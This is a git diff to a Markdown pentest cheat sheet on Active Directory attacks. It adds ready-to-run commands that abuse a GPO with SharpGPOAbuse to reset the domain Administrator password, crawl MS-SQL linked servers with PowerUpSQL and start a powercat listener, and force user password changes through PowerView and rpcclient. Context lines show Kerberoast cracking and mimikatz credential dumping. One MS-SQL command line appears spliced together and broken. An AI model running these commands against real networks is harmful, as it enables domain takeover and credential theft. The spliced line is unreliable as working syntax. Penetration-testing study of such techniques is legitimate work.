@@ -235,6 +235,19 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 --> To protect against this attack, we must avoid having *SPN* on user accounts, in favor of machine accounts.  
 --> If it is necessary, we should use Microsoft’s Managed Service Accounts (MSA) feature, ensuring that the account password is robust and changed regularly and automatically
 
+### Abusing Vulnerable GPO
+```
+\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
+```
+
+### Abusing MS-SQL Service
+
+```
+. ./PowerUPSQL.ps1
+Get-SQLInstanceLocal -Verbose
+(Get-SQLServerLinkCrawl -Verbose -Instance "10.10.10.20" -Query 'select * from master..sysservers').customquery Import-Module .\powercat.ps1 powercat -l -v -p 443 -t 10000
+```
+
 ### Relay attacks
 <img src="./images/smb_relay.png" width="250"/>
 
@@ -399,8 +412,30 @@ Serve-Html = On
 
 ### WSUS
 
-### Protected Process
-- https://itm4n.github.io/lsass-runasppl/
+### ACL / DACL Exploitation
+- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
+- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#forcechangepassword
+
+#####  ForceChangePassword
+- https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password
+If we have *ExtendedRight* on *User-Force-Change-Password* object type, we can reset the user's password without knowing their current password.  
+
+Returns the ACLs associated with jdoe user in DOMAIN.local domain and resolve GUIDs to their display names
+```
+Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "DOMAIN.local\jdoe"}
+
+```
+
+```
+. .\PowerView.ps1
+Set-DomainUserPassword -Identity User -Verbose
+```
+
+Using *rpcclient*
+```
+rpcclient -U jdoe 10.10.10.192
+setuserinfo2 victimUser 23 'Pass123!'
+```
 
 ### MachineAccountQuota (MAQ)
 - https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/
@@ -784,7 +819,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 Since *Windows 8.1* you can protect LSA storage using Protected Process ([RunAsPPL](https://itm4n.github.io/lsass-runasppl/)).  
 --> This will prevent regular ```mimikatz.exe sekurlsa:logonpasswords``` for working properly.
 
-With this registry key enable, the following *3* actions (which require an handle on LSASS) will no longer be possible:
+With this registry key enable, the following *3* actions (which require an handle on LSASS  ) will no longer be possible:
 ```
 sekurlsa:logonpasswords
 lsadump::lsa: Did not work
